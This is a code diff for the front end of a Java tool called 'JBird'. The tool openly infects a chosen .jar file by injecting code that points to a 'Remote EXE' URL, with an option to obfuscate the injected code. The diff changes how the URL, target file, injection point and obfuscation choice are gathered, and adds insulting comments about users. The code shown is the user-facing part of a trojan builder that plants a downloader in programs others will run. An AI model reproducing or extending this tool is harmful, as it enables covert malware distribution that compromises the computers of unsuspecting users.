@@ -8,43 +8,39 @@ public class Application {
         System.out.println("Starting JBird v" + Settings.VERSION);
         System.out.println("Created by Contra. Visit RECoders.org");
         String url;
-        String mname = "<clinit>";
+        String mname;
         String file = null;
-        boolean obfuscate = true;
-        if (args.length == 0) {
-            url = JOptionPane.showInputDialog("Remote EXE:", "http://example.com/test.exe");
-            JFileChooser chooser = new JFileChooser();
-            chooser.setFileFilter(UI.getGenericFilter("jar"));
-            int returnVal = chooser.showDialog(null, "Infect");
-            if (returnVal == JFileChooser.APPROVE_OPTION) {
-                file = chooser.getSelectedFile().getAbsolutePath();
-            } else {
-                close("Please select a file next time.");
-            }
-            String[] appchoices = {"Standalone Program", "Script/Plugin/Other"};
-            String appinput = UI.getComboInput(appchoices, "Program Type", "Please select the type of program");
-            if (appinput == null) {
-                close("Input Required!");
-            } else if (appinput == appchoices[0]) {
-                mname = "main";
-            }
-            String[] obchoices = {"Obfuscate", "Don't Obfuscate"};
-            String obinput = UI.getComboInput(obchoices, "Obfuscation", "Would you like to obfuscate injected code?");
-            if (obinput == null) {
-                close("Input Required!");
-            } else if (obinput == obchoices[1]) {
-                obfuscate = false;
-            }
-        } else {
-            file = args[0];
-            url = args[1];
+        boolean obfuscate;
+        String obinput;
+        String appinput;
+
+        if (args.length > 0) close("Don't try to use the command line shithead");
+
+        /* STUPID FUCKING USER INPUT FOR NOOB DUMBASSES */
+        url = JOptionPane.showInputDialog("Remote EXE:", "http://example.com/test.exe");
+
+        //File Selector
+        JFileChooser chooser = new JFileChooser();
+        chooser.setFileFilter(UI.getGenericFilter("jar"));
+        if (chooser.showDialog(null, "Infect") == JFileChooser.APPROVE_OPTION) file = chooser.getSelectedFile().getAbsolutePath();
+
+        //App Type
+        String[] appchoices = {"Standalone Program", "Script/Plugin/Other"};
+        appinput = UI.getComboInput(appchoices, "Program Type", "Please select the type of program");
+        mname = appinput != null && appinput.equals(appchoices[0]) ? "main" : "<clinit>";
+
+        //Obfuscation Options
+        String[] obchoices = {"Obfuscate", "Don't Obfuscate"};
+        obinput = UI.getComboInput(obchoices, "Obfuscation", "Would you like to obfuscate injected code?");
+        obfuscate = obinput != null && !obinput.equals(obchoices[1]);
+
+        if ((file == null) || (url == null) || (appinput == null) || (obinput == null)) {
+            close("Missing input. Please fill in all fields appropriately.");
         }
         Injector inf = new Injector(file, url, mname);
         inf.load();
         inf.inject();
-        if (obfuscate) {
-            inf.obfuscate();
-        }
+        if (obfuscate) inf.obfuscate();
         inf.save();
         close("Process Completed!");
     }
